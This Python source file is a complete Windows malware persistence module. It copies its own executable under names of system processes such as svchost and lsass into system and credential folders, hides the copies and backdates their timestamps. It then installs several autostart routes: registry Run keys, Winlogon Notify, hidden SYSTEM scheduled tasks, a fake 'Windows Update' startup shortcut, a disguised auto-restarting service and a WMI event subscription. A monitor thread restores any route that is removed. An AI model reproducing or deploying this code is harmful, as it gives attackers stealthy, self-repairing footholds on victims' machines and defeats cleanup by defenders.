
import os
import sys
import shutil
import time
import subprocess
import ctypes
import winreg
import hashlib
import getpass
import threading
import random
import string




def generate_random_filename():
   
    system_files = [
        "svchost", "lsass", "services", "winlogon", "csrss",
        "smss", "dwm", "explorer", "spoolsv", "taskhost",
        "rundll32", "regsvr32", "msiexec", "wscript", "cscript"
    ]
    
    extensions = [".exe", ".dll", ".sys", ".dat", ".tmp"]
    
    filename = random.choice(system_files)
    
   
    if random.random() < 0.3:
        filename += str(random.randint(1, 99))
    
    filename += random.choice(extensions)
    return filename




def get_system_paths():
   
    paths = []
    
  
    appdata = os.environ.get('APPDATA', '')
    if appdata:
    
        microsoft_folders = [
            "Microsoft\\Windows\\System32",
            "Microsoft\\Windows\\Security",
            "Microsoft\\Windows\\Updates",
            "Microsoft\\Windows\\Crypto",
            "Microsoft\\Windows\\NetCache"
        ]
        
        for folder in microsoft_folders:
            path = os.path.join(appdata, folder)
            paths.append(os.path.join(path, generate_random_filename()))
    
    
    programdata = os.environ.get('ProgramData', '')
    if programdata:
        programdata_folders = [
            "Microsoft\\Windows\\Start Menu\\Programs\\Startup",
            "Microsoft\\Windows\\Ringtones",
            "Microsoft\\Windows\\Media",
            "Microsoft\\Windows\\Templates"
        ]
        
        for folder in programdata_folders:
            path = os.path.join(programdata, folder)
            paths.append(os.path.join(path, generate_random_filename()))
    
    system_folders = [
        os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), "Temp"),
        os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), "Prefetch"),
        os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), "Logs"),
        os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), "Debug"),
        os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), "Microsoft.NET")
    ]
    
    for folder in system_folders:
        if os.path.exists(folder):
            paths.append(os.path.join(folder, generate_random_filename()))
    
   
    user_profile = os.environ.get('USERPROFILE', '')
    if user_profile:
        user_folders = [
            "AppData\\Local\\Microsoft\\Credentials",
            "AppData\\Local\\Microsoft\\Windows\\History",
            "AppData\\Local\\Microsoft\\Windows\\INetCache",
            "AppData\\Local\\Temp\\Low"
        ]
        
        for folder in user_folders:
            path = os.path.join(user_profile, folder)
            paths.append(os.path.join(path, generate_random_filename()))
    
    return paths





def install_to_best_location():
    
    current_exe = sys.executable or sys.argv[0]
    current_exe = os.path.abspath(current_exe)
    
    system_paths = get_system_paths()
    random.shuffle(system_paths) 
    
    for install_path in system_paths:
        try:
          
            os.makedirs(os.path.dirname(install_path), exist_ok=True)
            
           
            if os.path.exists(install_path):
                try:
                    current_hash = hash_file(current_exe)
                    installed_hash = hash_file(install_path)
                    
                    if current_hash == installed_hash:
                        return install_path  
                    
                    os.remove(install_path)  
                except:
                    os.remove(install_path)
            
           
            shutil.copy2(current_exe, install_path)
            
          
            hide_file(install_path)
            
          
            fake_file_time(install_path)
            
            return install_path
            
        except Exception:
            continue
    
    return None

def hash_file(filepath):
   
    try:
        hasher = hashlib.sha256()
        with open(filepath, 'rb') as f:
            buf = f.read(65536)
            while len(buf) > 0:
                hasher.update(buf)
                buf = f.read(65536)
        return hasher.hexdigest()
    except:
        return None







def hide_file(file_path):
   
    try:
        
        ctypes.windll.kernel32.SetFileAttributesW(file_path, 6)
        
       
        try:
            import win32security
            import win32api
            import ntsecuritycon
            
           
            pass
        except:
            pass
        
        return True
    except:
        return False




def fake_file_time(file_path):
    
    try:
     
        old_time = time.time() - random.randint(31536000, 63072000)  
        
    
        os.utime(file_path, (old_time, old_time))
        
        return True
    except:
        return False


def execute_hidden(cmd):
    
    try:
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True,
            text=True,
            startupinfo=startupinfo,
            timeout=30
        )
        
        return result.returncode == 0
    except:
        return False






def setup_registry_persistence(install_path):
   
    methods = []
    
   
    try:
        value_names = ["WindowsSpooler", "SystemRuntime", "WindowsUpdate", "SecurityHealth"]
        
        for value_name in value_names:
            try:
                key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                    0, winreg.KEY_SET_VALUE | winreg.KEY_WRITE
                )
                winreg.SetValueEx(key, value_name, 0, winreg.REG_SZ, install_path)
                winreg.CloseKey(key)
                methods.append(f"HKCU\\Run\\{value_name}")
                break  
            except:
                continue
    except:
        pass
    
   
    try:
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            "Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx",
            0, winreg.KEY_SET_VALUE | winreg.KEY_WRITE
        )
        winreg.SetValueEx(key, "0001", 0, winreg.REG_SZ, f"{install_path} /setup")
        winreg.CloseKey(key)
        methods.append("HKCU\\RunOnceEx")
    except:
        pass
    
   
    if is_admin():
        try:
            key = winreg.CreateKey(
                winreg.HKEY_LOCAL_MACHINE,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run"
            )
            winreg.SetValueEx(key, "WindowsDefender", 0, winreg.REG_SZ, install_path)
            winreg.CloseKey(key)
            methods.append("HKLM\\Policies\\Explorer\\Run")
        except:
            pass
    
    return methods



def setup_scheduled_tasks(install_path):
   
    methods = []
    
    
    task_id = hashlib.md5(install_path.encode()).hexdigest()[:8]
    task_names = [
        f"Microsoft\\Windows\\WindowsUpdate\\WindowsUpdateTask_{task_id}",
        f"Microsoft\\Windows\\Maintenance\\MaintenanceTask_{task_id}",
        f"Microsoft\\Windows\\Diagnosis\\DiagnosisTask_{task_id}"
    ]
    
    for task_name in task_names:
        try:
          
            ps_script = f'''
$taskName = "{task_name}"
$action = New-ScheduledTaskAction -Execute "{install_path}"
$trigger = New-ScheduledTaskTrigger -AtLogOn
$trigger2 = New-ScheduledTaskTrigger -Daily -At 3am
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger, $trigger2 -Principal $principal -Settings $settings -Force
'''
            
          
            temp_ps = os.path.join(os.environ['TEMP'], f"task_{task_id}.ps1")
            with open(temp_ps, 'w', encoding='utf-8') as f:
                f.write(ps_script)
            
            cmd = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "{temp_ps}"'
            if execute_hidden(cmd):
                methods.append(f"Task:{task_name}")
                time.sleep(0.5)  
            
          
            try:
                os.remove(temp_ps)
            except:
                pass
                
        except:
            continue
    
    return methods




def setup_startup_methods(install_path):
    
    methods = []
    
   
    try:
        startup_folders = [
            os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
            os.path.join(os.environ['USERPROFILE'], 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
        ]
        
        for folder in startup_folders:
            if os.path.exists(folder):
                shortcut_path = os.path.join(folder, "Windows Update.lnk")
                
               
                vbs_script = f'''
Set oWS = WScript.CreateObject("WScript.Shell")
sLinkFile = "{shortcut_path}"
Set oLink = oWS.CreateShortcut(sLinkFile)
oLink.TargetPath = "{install_path}"
oLink.WorkingDirectory = "{os.path.dirname(install_path)}"
oLink.Description = "Windows Update"
oLink.IconLocation = "shell32.dll,1"
oLink.Save
'''
                
                temp_vbs = os.path.join(os.environ['TEMP'], "startup.vbs")
                with open(temp_vbs, 'w') as f:
                    f.write(vbs_script)
                
                cmd = f'wscript //B "{temp_vbs}"'
                if execute_hidden(cmd):
                    methods.append(f"Startup:{os.path.basename(folder)}")
                    hide_file(shortcut_path)
                
                try:
                    os.remove(temp_vbs)
                except:
                    pass
                
                break  
    except:
        pass
    
   
    if is_admin():
        try:
            key = winreg.OpenKey(
                winreg.HKEY_LOCAL_MACHINE,
                "Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
                0, winreg.KEY_SET_VALUE | winreg.KEY_WRITE
            )
            current = winreg.QueryValueEx(key, "Notify")[0]
            if install_path not in current:
                new_value = f"{current};{install_path}" if current else install_path
                winreg.SetValueEx(key, "Notify", 0, winreg.REG_SZ, new_value)
                methods.append("Winlogon\\Notify")
            winreg.CloseKey(key)
        except:
            pass
    
    return methods




def setup_windows_service(install_path):
   
    if not is_admin():
        return []
    
    methods = []
    
    try:
       
        service_id = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
        service_name = f"WinSvc{service_id}"
        display_name = f"Windows {random.choice(['Update', 'Security', 'Defender', 'Management'])} Service"
        
     
        create_cmd = f'sc create "{service_name}" binPath= "{install_path}" start= auto DisplayName= "{display_name}" type= own'
        
        if execute_hidden(create_cmd):
          
            failure_cmd = f'sc failure "{service_name}" reset= 86400 actions= restart/5000/restart/10000'
            execute_hidden(failure_cmd)
            
          
            start_cmd = f'sc start "{service_name}"'
            execute_hidden(start_cmd)
            
            methods.append(f"Service:{service_name}")
    except:
        pass
    
    return methods

def setup_wmi_persistence(install_path):
   
    methods = []
    
    try:
        
        wmi_script = f'''
$filterArgs = @{{
    Name = "StartupFilter_{hashlib.md5(install_path.encode()).hexdigest()[:8]}"
    EventNameSpace = 'root\\cimv2'
    QueryLanguage = 'WQL'
    Query = "SELECT * FROM Win32_ProcessStartTrace"
}}
$filter = Set-WmiInstance -Namespace root/subscription -Class __EventFilter -Arguments $filterArgs

$consumerArgs = @{{
    Name = "StartupConsumer_{hashlib.md5(install_path.encode()).hexdigest()[:8]}"
    CommandLineTemplate = "{install_path}"
}}
$consumer = Set-WmiInstance -Namespace root/subscription -Class CommandLineEventConsumer -Arguments $consumerArgs

$bindingArgs = @{{
    Filter = $filter
    Consumer = $consumer
}}
$binding = Set-WmiInstance -Namespace root/subscription -Class __FilterToConsumerBinding -Arguments $bindingArgs
'''
        
        temp_ps = os.path.join(os.environ['TEMP'], "wmi_persistence.ps1")
        with open(temp_ps, 'w', encoding='utf-8') as f:
            f.write(wmi_script)
        
        cmd = f'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "{temp_ps}"'
        if execute_hidden(cmd):
            methods.append("WMI\\EventConsumer")
        
        try:
            os.remove(temp_ps)
        except:
            pass
    except:
        pass
    
    return methods


class PersistenceMonitor:
    
    
    def __init__(self):
        self.install_path = None
        self.active_methods = []
        self.monitoring = False
        self.check_interval = 600 




    def initialize(self):
        
        self.install_path = install_to_best_location()
        if not self.install_path:
            return False
        
       
        all_methods = []
        
      
        registry_methods = setup_registry_persistence(self.install_path)
        all_methods.extend(registry_methods)
        
    
        task_methods = setup_scheduled_tasks(self.install_path)
        all_methods.extend(task_methods)
        
    
        startup_methods = setup_startup_methods(self.install_path)
        all_methods.extend(startup_methods)
        
      
        if is_admin():
            service_methods = setup_windows_service(self.install_path)
            all_methods.extend(service_methods)
            
           
            wmi_methods = setup_wmi_persistence(self.install_path)
            all_methods.extend(wmi_methods)
        
        self.active_methods = all_methods
        
       
        self.start_monitoring()
        
        return len(self.active_methods) > 0
    





    def check_persistence(self):
        
        if not self.install_path:
            return False
        
      
        if not os.path.exists(self.install_path):
            return False
        
   
        active_count = 0
        
      
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_READ
            )
            
            i = 0
            while True:
                try:
                    value_name, value_data, value_type = winreg.EnumValue(key, i)
                    if value_type == winreg.REG_SZ and self.install_path in value_data:
                        active_count += 1
                        break
                    i += 1
                except OSError:
                    break
            winreg.CloseKey(key)
        except:
            pass
        
       
        try:
            cmd = 'schtasks /query /fo list'
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=10)
            if self.install_path in result.stdout:
                active_count += 1
        except:
            pass
        
       
        startup_folders = [
            os.path.join(os.environ['APPDATA'], 'Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
            os.path.join(os.environ['USERPROFILE'], 'AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'),
        ]
        
        for folder in startup_folders:
            if os.path.exists(folder):
                for file in os.listdir(folder):
                    if file.endswith('.lnk'):
                        shortcut = os.path.join(folder, file)
                        try:
                           
                            import winshell
                            try:
                                shell = winshell.shortcut(shortcut)
                                if self.install_path in shell.path:
                                    active_count += 1
                                    break
                            except:
                                pass
                        except:
                            pass
        
        return active_count >= 1
    



    def repair_persistence(self):
        
        return self.initialize()
    



    def monitor_loop(self):
      
        while self.monitoring:
            try:
                if not self.check_persistence():
                  
                    self.repair_persistence()
                
            
                time.sleep(self.check_interval)
                
            except Exception as e:
               
                time.sleep(self.check_interval)
    




    def start_monitoring(self):
      
        if not self.monitoring:
            self.monitoring = True
            monitor_thread = threading.Thread(target=self.monitor_loop, daemon=True)
            monitor_thread.start()
    



    def stop_monitoring(self):
       
        self.monitoring = False



    def cleanup(self):
      
        try:
         
            if self.install_path and os.path.exists(self.install_path):
             
                cmd = f'ping 127.0.0.1 -n 3 > nul & del /f /q "{self.install_path}"'
                execute_hidden(cmd)
            
            self.stop_monitoring()
            return True
        except:
            return False







def establish_system_persistence():

    monitor = PersistenceMonitor()
    
    if monitor.initialize():

        try:
            log_path = os.path.join(os.environ['TEMP'], "system.log")
            with open(log_path, 'a') as f:
                f.write(f"[{time.ctime()}] Persistence established with {len(monitor.active_methods)} methods\n")
        except:
            pass
        
        return True
    
    return False


persistence_monitor = None




def auto_initialize():
   
    global persistence_monitor
    
    persistence_monitor = PersistenceMonitor()
    return persistence_monitor.initialize()






if __name__ == "__main__":
    
    print("Initializing persistence system...")
    if establish_system_persistence():
        print("Persistence established successfully")
        print("System will maintain itself automatically")
    else:
        print("Failed to establish persistence")